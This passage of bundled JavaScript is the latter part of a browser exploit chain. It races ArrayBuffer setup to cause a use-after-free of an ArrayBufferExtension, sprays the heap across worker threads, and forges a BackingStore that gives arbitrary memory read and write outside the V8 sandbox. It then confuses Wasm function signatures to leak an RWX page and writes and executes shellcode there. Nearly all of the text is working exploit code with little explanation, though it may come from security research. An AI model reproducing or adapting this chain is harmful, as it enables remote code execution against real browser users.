fake_array_buf_ext_view.setUint8(0x0d, 0, true);                                    //young_gc_state_
fake_array_buf_ext_view.setBigUint64(0x10, fake_backing_store_addr, true);          //backing_store_ data ptr
fake_array_buf_ext_view.setBigUint64(0x18, fake_backing_store_addr + 0x100n, true); //backing_store_ refcnts ptr
fake_array_buf_ext_view.setBigUint64(0x20, 0n, true);                               //next_

//Prepare all relevant workers for later
let hammer = await WriteHammer.start_new();

class HeapSprayer {
    static NUM_SPRAY_THREADS = 35;

    static async create() {
        let sprayer = new HeapSprayer();

        //Start a bunch of spray workers
        async function spray_worker(id) {
            //Receive the control buffer from the main thread
            let msg = await new Promise(rslv => onmessage = rslv);
            onmessage = null;

            let payload = new Uint8Array(msg.data);
            let ctrl = new Int32Array(msg.data, 0x100);
            ctrl[2] = 1; // - tell the main thread we're ready

            while(true) {
                //Wait until it's go time
                while(!ctrl[0]) Atomics.wait(ctrl, 0, 0);
                let spray_len = ctrl[0];

                // - wait until it's specifically our thread's turn
                while(ctrl[1] != id);

                //Spray using the std::vector<uint8_t> allocated by String.fromCodePoint
                let spray = payload.subarray(0, spray_len);

                let spray_cnt = 200; // - setting this too high causes a stack overflow
                function spray_rec() {
                    if(spray_cnt-- <= 0) {
                        //We can't allocate anymore; wait until the main thread tells us to stop
                        ctrl[1]++;

                        // - wait until we should free everything & all threads before us freed
                        while(ctrl[0]) Atomics.wait(ctrl, 0, spray_len);
                        while(ctrl[1] > id+1);
                    } else {
                        //Recursively invoke fromCodePoint, keeping the current spray buffer alive until we return
                        String.fromCodePoint(...spray, { valueOf: spray_rec });
                    }
                    return 0x21;
                }
                spray_rec();

                ctrl[1]--;
            }
        }

        for(let i = 0; i < HeapSprayer.NUM_SPRAY_THREADS; i++) {
            //Start a worker, send it the control buffer, and wait till it's ready
            let worker = start_worker_func([flush_young_gen, sleep], spray_worker, i);

            worker.postMessage(sprayer.shared_buf);
            while(!sprayer.control[2]) await evt_loop_yield();

            // - reset the done flag for the next worker
            sprayer.control[2] = 0;
        }

        return sprayer;
    }

    constructor() {
        this.shared_buf = new SharedArrayBuffer(0x200);
        this.payload = new Uint8Array(this.shared_buf, 0);
        this.control = new Int32Array(this.shared_buf, 0x100);
    }

    spray(payload) {
        //Copy over the spray payload to the control buffer, then start the spray
        this.payload.set(new Uint8Array(payload));
        Atomics.store(this.control, 0, payload.byteLength);
        Atomics.notify(this.control, 0);

        //Wait for all threads to have completed their spray
        while(Atomics.load(this.control, 1) < HeapSprayer.NUM_SPRAY_THREADS);
    }

    free_spray() {
        //Stop the spray
        Atomics.store(this.control, 0, 0);
        Atomics.notify(this.control, 0);

        //Wait for all threads to have freed their spray
        while(Atomics.load(this.control, 1) > 0);
    }
}

log("preparing heap sprayer");
let heap_sprayer = await HeapSprayer.create();

//Allocate a victim ArrayBufferExtension which we'll target
//To achieve this, we allocate a bunch of ArrayBufferExtensions in a row, and only keep the middle one
log("spraying ArrayBufferExtensions");

let bufs = [];
for(let i = 0; i < 0x80000; i++) bufs[i] = new ArrayBuffer(0x10);
flush_young_gen();
for(let i = 0; i < bufs.length; i++) bufs[i] = bufs[i].transfer();
major_gc();

//Now that we allocated our target extensions, we can grab our victim extension
let victim_buf = bufs.pop();

//Read the victim extension's handle
let victim_ext = hread32(addrof(victim_buf) + 0x2c);
log(`victim ArrayBufferExtension handle: 0x${victim_ext.toString(16)}`);

//Prepare for the following section of the exploit
//During it, we must not trigger any GCs to not mess up the final step, so we flush the young generation to give us as much time until memory runs out as we can get
flush_young_gen();

//Allocate a heap-backed TypedArray, and obtain the address of its associated ArrayBuffer before it is initalized 
let pwn_arr = new Uint8Array(0x21);
pwn_arr[0] = 0x21;

let addr_pwn_arr_buf = hread32(addrof(pwn_arr) + 0x10) & ~1;
log(`TypedArray ArrayBuffer addr: 0x${addr_pwn_arr_buf.toString(16)}`);
if(hread32(addr_pwn_arr_buf + 0x2c) != 0) throw new Error("TypedArray ArrayBufferExtension isn't null");

//Initialize the typed array's ArrayBuffer; this will call JSArrayBuffer::Setup, which will allocate a new ArrayBufferExtension, and use register it with the ArrayBufferSweeper later down the line
//We try to overwrite the extension handle during this window of time after the allocation of the array buffer extension, but before its registration
//If we win this race, this will insert ArrayBufferExtension into the young generation as well, effectively making it part of both generations
hammer.write_to(addr_pwn_arr_buf + 0x2c, victim_ext);
pwn_arr.buffer; // - trigger the initialization of the ArrayBuffer
hammer.stop();

//Ensure we won the race
//This check works since if we won the race, the victim ArrayBufferExtension's associated backing_store will have been overwritten, and ArrayBuffer.transfer() reads the byte length from the backing store directly
if(victim_buf.transfer().byteLength != 0x21) throw new Error("didn't win TypedArray race condition");

log("won JSArrayBuffer::Setup race");

//Ensure there are slot spans with enough entries to fulfill any requests
//Without this, our UaF would make our victim slot span the active slot span, which mean it won't survive long
//This also serves to flush our victim extension out of the thread cache after its freed from the young generation sweep
log("allocating sacrificial ArrayBufferExtensions");

let ext_spray_buf = new ArrayBuffer(0x10);
for(let i = 0; i < 0x600; i++) ext_spray_buf = ext_spray_buf.transfer();
ext_spray_buf = null;

//Trigger the ArrayBufferSweeper using a minor GC
//Ever since we started this process, we should not have ran a GC, which means this sweep will free all young generation sacrifical ArrayBufferExtensions + the victim extension in one go
log("triggering young generation ArrayBufferSweeper sweep");

pwn_arr = null;
victim_buf = null;
evict_young_gen();
await sleep(1000); // - give ArrayBufferSweeper some time to run

//The sacrificial ArrayBufferExtensions ensured our victim extension ended up in its own free list; however, they can't undo the damage done by the thread cache's poisoning
//As such spray null bytes on the heap to ensure we don't crash on the next major GC
//This also conveniently replaces the allocation being UaFed with a much simpler one, without complex destructor logic which can blow up on us
log("spraying nulls to repair victim ArrayBufferExtension");

heap_sprayer.spray(new Uint8Array(0x30).fill(0).buffer);

//Allocate a bunch of sacrificial ArrayBufferExtensions in the old generation
//Their purpose is the same as earlier (i.e. flush the tcache)
//They are picked up by the sweeper even though we truncated the list using our spray since our fake entry is at the tail of the old generation list, meaning new entries still get properly appended
log("allocating sacrificial old generation ArrayBufferExtensions");

let tcache_flush = [];
for(let i = 0; i < 0x280; i++) tcache_flush[i] = new ArrayBuffer(0x10);
evict_young_gen();

//Trigger a major GC; this will trigger a sweep of all old generation ArrayBufferExtensions, cause the victim ArrayBufferExtension to be freed again
log("triggering old generation ArrayBufferSweeper sweep");

tcache_flush = null;
major_gc();
await sleep(1000); // - give ArrayBufferSweeper some time to run

//Allocate a bunch of ArrayBufferExtensions to hopefully reclaim the memory which we have a dangling reference to with an ArrayBufferExtension
//Most cruicially, this creates a new external pointer handle which points to this ArrayBufferExtension
//We can then free our spray allocations, which also frees the ArrayBufferExtension again, but cruicially it does not destroy the created handle!
//This way we can then spray again to control the same memory slot again, giving us full control over an ArrayBufferExtension with a valid handle
log("reclaiming victim ArrayBufferExtension with proper ArrayBufferExtensions");
let ext_spray = bufs.map(b => b.transfer());
bufs = null;

log("freeing original spray");
heap_sprayer.free_spray();

log("spraying fake ArrayBufferExtension contents");
heap_sprayer.spray(fake_array_buf_ext);

//Transfer all of our sprayed extensions; if everything went according to plan, one of them now holds our sprayed data
//By doing this we smuggle the contained BackingStore pointer into a "clean" extension
log("recovering fake BackingStore");

let fake_buf = null;
for(let i = 0; i < ext_spray.length; i++) {
    ext_spray[i] = ext_spray[i].transfer();
    if(ext_spray[i].byteLength == 0x1337) {
        fake_buf = ext_spray[i];
        ext_spray[i] = null;
        break;
    }
}

if(fake_buf == null) throw new Error("failed to recover fake BackingStore ArrayBuffer");

//Cleanup
log("cleaning up...");
major_gc();

//With pure V8, we would be screwed now; we have control over a BackingStore, but almost nothing reads buffer_start_ directly
//Luckily we have access to Blink / DOM APIs, and Blink's mirror DOMArrayBuffer(View) classes does use this field a lot :p
const AUDIO_BUF = new AudioBuffer({ length: 2, numberOfChannels: 1, sampleRate: 3000 });

vread32 = function vread32(addr) {
    fake_backing_store_view.setBigUint64(0x00, addr, true);     //buffer_start_
    fake_backing_store_view.setBigUint64(0x08, 4n, true);       //byte_length_
    fake_backing_store_view.setBigUint64(0x10, 4n, true);       //max_byte_length_

    let val_arr = new Uint32Array(1);
    AUDIO_BUF.copyToChannel(new Float32Array(fake_buf, 0, 1), 0, 0);
    AUDIO_BUF.copyFromChannel(new Float32Array(val_arr.buffer, 0, 1), 0, 0);
    return val_arr[0];
};

vread64 = function vread64(addr) {
    fake_backing_store_view.setBigUint64(0x00, addr, true);     //buffer_start_
    fake_backing_store_view.setBigUint64(0x08, 8n, true);       //byte_length_
    fake_backing_store_view.setBigUint64(0x10, 8n, true);       //max_byte_length_

    let val_arr = new BigUint64Array(1);
    AUDIO_BUF.copyToChannel(new Float32Array(fake_buf, 0, 2), 0, 0);
    AUDIO_BUF.copyFromChannel(new Float32Array(val_arr.buffer, 0, 2), 0, 0);
    return val_arr[0];
};

vwrite32 = function vwrite32(addr, val) {
    fake_backing_store_view.setBigUint64(0x00, addr, true);     //buffer_start_
    fake_backing_store_view.setBigUint64(0x08, 4n, true);       //byte_length_
    fake_backing_store_view.setBigUint64(0x10, 4n, true);       //max_byte_length_

    AUDIO_BUF.copyToChannel(new Float32Array(new Uint32Array([val]).buffer, 0, 1), 0, 0);
    AUDIO_BUF.copyFromChannel(new Float32Array(fake_buf, 0, 1), 0, 0);
};
vwrite64 = function vwrite64(addr, val) {
    fake_backing_store_view.setBigUint64(0x00, addr, true);     //buffer_start_
    fake_backing_store_view.setBigUint64(0x08, 8n, true);       //byte_length_
    fake_backing_store_view.setBigUint64(0x10, 8n, true);       //max_byte_length_

    AUDIO_BUF.copyToChannel(new Float32Array(new BigUint64Array([val]).buffer, 0, 2), 0, 0);
    AUDIO_BUF.copyFromChannel(new Float32Array(fake_buf, 0, 2), 0, 0);
};

log(" - success!");


delete spray_rec;
delete spray_worker;
}
/* ############### END research:sandbox/arraybuf-ext-uaf/exploit-blink.js ############### */

/* ############### START base:bootstrap/mem-rw-to-rce.js ############### */
{
let log = msg => _log_impl('base:bootstrap/mem-rw-to-rce.js', msg);



/* file base:utils/basics.js already imported */

//Find default_isolate_group.reservation_
//It is easy to pick up since it has the sandbox base address two times in short succession (VirtualMemoryCage::base_ and VirtualMemoryCage::reservation_.region_.address_)
let vaddr_default_isolate_group;
for(let addr = BINARY_POINTER;; addr -= 8n) {
    if(vread64(addr) == SANDBOX_BASE && vread64(addr + 0x20n) == SANDBOX_BASE) {
        // - we can calculate the address of default_isolate_group based of this
        vaddr_default_isolate_group = addr - 0x20n;
        break;
    }
}

log(`&IsolateGroup::default_isolate_group: 0x${vaddr_default_isolate_group.toString(16)}`);

//Traverse down the object hierarchy to get the address of the trusted pointer table
// - search for the shared_read_only_heap_ pointer
function is_pointer(val) {
    if((val & 0xffff000000000007n) != 0n) return false;
    if((val & 0x0000fff000000000n) == 0n) return false;
    return true;
}

let vaddr_read_only_space = null;
for(let off = 0n; off < 0x5000n; off += 8n) {
    let val = vread64(vaddr_default_isolate_group + off);

    //Check if this could be a valid pointer
    if(!is_pointer(val)) continue;

    //Check if this looks like a ReadOnlyHeap instance
    // - check for roots_init_complete_
    if(vread64(val) != 1n) continue;

    // - check for read_only_space_
    let ptr = vread64(val + 8n);
    if(!is_pointer(ptr)) continue;

    log(`IsolateGroup::shared_read_only_heap_: 0x${val.toString(16)}`);
    log(`ReadOnlyHeap::read_only_space_: 0x${ptr.toString(16)}`);
    vaddr_read_only_space = ptr;
    break;
}

if(vaddr_read_only_space == null) throw new Error("didn't find ReadOnlyHeap pointer in IsolateGroup");

// - grab the isolate from read_only_space_
let vaddr_heap = vread64(vaddr_read_only_space + 8n);
log(`BaseSpace::heap_: 0x${vaddr_heap.toString(16)}`);

let vaddr_isolate = vread64(vaddr_heap + 0x18n);
log(`Heap::isolate_: 0x${vaddr_isolate.toString(16)}`);

// - search for the trusted pointer table in the isolate
// - it's right after trusted_cage_base, which is a bit after ourwhich we can nicely match for
let vaddr_trusted_ptr_table = null;
for(let off = 0n; off < 0x800n; off += 8n) {
    let val = vread64(vaddr_isolate + off);

    //Must be a valid pointer cage base, excluding the known sandbox base
    if(!is_pointer(val)) continue;
    if((val & 0xffffffffn) != 0n) continue;
    if(val == SANDBOX_BASE) continue;

    //Must be followed by a valid SegmentedTable
    let base = vread64(vaddr_isolate + off + 0x8n);
    let addr_space = vread64(vaddr_isolate + off + 0x10n);
    if(!is_pointer(base) || !is_pointer(addr_space)) continue;

    // - perform some sanity checks on the VirtualAddressSpace
    let addr_space_base = vread64(addr_space + 0x18n);
    let addr_space_size = vread64(addr_space + 0x20n);
    if((addr_space_base & 0xfffn) || (addr_space_size & 0xfffn)) continue;
    if(base < addr_space_base || base >= addr_space_base + addr_space_size) continue;

    vaddr_trusted_ptr_table = vaddr_isolate + off + 8n;
    break;
}

if(vaddr_trusted_ptr_table == null) throw new Error("didn't find TrustedPointerTable in IsolateGroup");

log(`&TrustedPointerTable: 0x${vaddr_trusted_ptr_table.toString(16)}`);

//Allocate a new Wasm module, and get the trusted WasmFunctionData pointer from one of its (wrapper) function
let wasm_mod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,8,1,4,115,116,117,98,0,0,10,5,1,3,0,1,11]));
let wasm_inst = new WebAssembly.Instance(wasm_mod);
let wasm_stub = wasm_inst.exports.stub;
wasm_stub(); // - ensure all fields are set

//Follow the object hierarchy into the trusted heap to obtain the code pointer
function lookup_trusted_ptr(handle) {
    //Read the tagged pointer
    let idx = handle >> 9;
    if(idx << 9 != handle) throw new Error(`invalid trusted pointer handle: 0x${handle.toString(16)}`);

    let base = vread64(vaddr_trusted_ptr_table);
    log(`TrustedPointerTable::base_: 0x${base.toString(16)}`);

    let tagged_ptr = vread64(base + BigInt(idx)*8n);
    log(`TrustedPointerTableEntry::payload_: 0x${tagged_ptr.toString(16)}`);

    return tagged_ptr & ((1n << BigInt(48)) - 1n)
}

function call_target_addr(func) {
    log(`Wasm function ${func.name}:`);

    let addr_sfi = hread32(addrof(func) + 16) & ~1;
    log(` - SFI addr: 0x${addr_sfi}`);
    
    let func_data_trusted_ptr = hread32(addr_sfi + 4);
    log(` - WasmFunctionData trusted pointer: 0x${func_data_trusted_ptr.toString(16)}`);
    
    let vaddr_func_data = lookup_trusted_ptr(func_data_trusted_ptr) & ~1n;
    log(` - WasmFunctionData address: 0x${vaddr_func_data.toString(16)}`);

    let vaddr_internal_func = (vaddr_func_data & ~0xffffffffn) + BigInt(vread32(vaddr_func_data + BigInt(20)) & ~1);
    log(` - WasmInternalFunction address: 0x${vaddr_internal_func.toString(16)}`);

    return vaddr_internal_func + BigInt(20);
}

exec_shellcode = function exec_shellcode(shellcode) {
    log("preparing for shellcode execution...");
    
    //Prepare the stub / stack leak module
    let stub_warmup = true;

    let wasm_mod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,161,1,4,96,128,1,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,1,111,96,0,0,96,16,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,1,126,96,0,1,111,2,27,2,2,106,115,7,115,116,117,98,95,99,98,0,1,2,106,115,7,108,101,97,107,95,99,98,0,0,3,4,3,2,3,0,7,41,3,4,115,116,117,98,0,2,10,115,116,97,99,107,95,108,101,97,107,0,3,17,115,116,97,99,107,95,108,101,97,107,95,112,119,110,115,105,103,0,4,10,152,2,3,7,0,16,0,66,185,10,11,6,1,1,126,208,114,11,134,2,1,1,126,32,0,32,1,32,2,32,3,32,4,32,5,32,6,32,7,32,8,32,9,32,10,32,11,32,12,32,13,32,14,32,15,32,16,32,17,32,18,32,19,32,20,32,21,32,22,32,23,32,24,32,25,32,26,32,27,32,28,32,29,32,30,32,31,32,32,32,33,32,34,32,35,32,36,32,37,32,38,32,39,32,40,32,41,32,42,32,43,32,44,32,45,32,46,32,47,32,48,32,49,32,50,32,51,32,52,32,53,32,54,32,55,32,56,32,57,32,58,32,59,32,60,32,61,32,62,32,63,32,64,32,65,32,66,32,67,32,68,32,69,32,70,32,71,32,72,32,73,32,74,32,75,32,76,32,77,32,78,32,79,32,80,32,81,32,82,32,83,32,84,32,85,32,86,32,87,32,88,32,89,32,90,32,91,32,92,32,93,32,94,32,95,32,96,32,97,32,98,32,99,32,100,32,101,32,102,32,103,32,104,32,105,32,106,32,107,32,108,32,109,32,110,32,111,32,112,32,113,32,114,32,115,32,116,32,117,32,118,32,119,32,120,32,121,32,122,32,123,32,124,32,125,32,126,32,127,16,1,11]));
    let wasm_inst = new WebAssembly.Instance(wasm_mod, {
        "js": {
            stub_cb,
            "leak_cb": (...leak) => leak
        }
    });
    let { stub, stack_leak, stack_leak_pwnsig } = wasm_inst.exports;

    // - optimize the victim stub, so that its JS2WASM stub will be in an RWX page
    log("optimizing victim stub...");

    const STUB_MARKER_ARG = 0x1337133713371337n;
    let stub_args = new Array(16).fill(STUB_MARKER_ARG);
    for(let i = 0; i < 500000; i++) stub(...stub_args);

    for(let i = 0; i < 100000; i++) stack_leak();

    // - confuse signatures
    let vaddr_leak_ct = call_target_addr(stack_leak); 
    let vaddr_leak_pwn_ct = call_target_addr(stack_leak_pwnsig);
    let leak_pwn_ct = vread32(vaddr_leak_pwn_ct);
    log(`stack_leak_pwnsig call target: 0x${leak_pwn_ct.toString(16)}`);
    vwrite32(vaddr_leak_ct, leak_pwn_ct);

    // - leak the stub return pointer, which points to the JS2WASM stub, leaking an RWX page
    let rwx_addr;
    function stub_cb() {
        if(stub_warmup) return;

        //Leak values from the stack
        let stack_leaks = stack_leak();
        
        //Look for the stub's JS2WASM argument buffer by searching for the marker argument
        let args_buf_idx = -1;
        for(let i = 1; i < stack_leaks.length; i++) {
            if(stack_leaks[i] == STUB_MARKER_ARG) {
                args_buf_idx = i;
                break;
            }
        }
        if(args_buf_idx < 0) throw new Error("failed to find stub JS2WASM argument buffer in stack leak");

        log(`stub JS2WASM args buffer leak index: ${args_buf_idx}`);

        //The value pushed right afterwards (so preceeding in memory) is the return address back into the JS2WASM stub
        rwx_addr = stack_leaks[args_buf_idx-1];
    }

    stub_warmup = false;
    stub(...stub_args);
    stub_warmup = true;

    log(`RWX addr: 0x${rwx_addr.toString(16)}`);

    // - write shellcode, then execute :)
    while(shellcode.length % 8 != 0) shellcode.push(0xcc);

    let shellcode_view = new DataView(new Uint8Array(shellcode).buffer)
    for(let i = 0; i < shellcode.length; i += 8) vwrite64(rwx_addr + BigInt(i), shellcode_view.getBigUint64(i, true));

    log("executing shellcode...");
    stub(...stub_args);
    log(" - returned successfully");
};



delete stub_cb;
delete call_target_addr;
delete lookup_trusted_ptr;
delete is_pointer;
}
/* ############### END base:bootstrap/mem-rw-to-rce.js ############### */


exec_shellcode([0xcc])

}
/* ############### END research:chains/2024-12-10/exploit.js ############### */

})();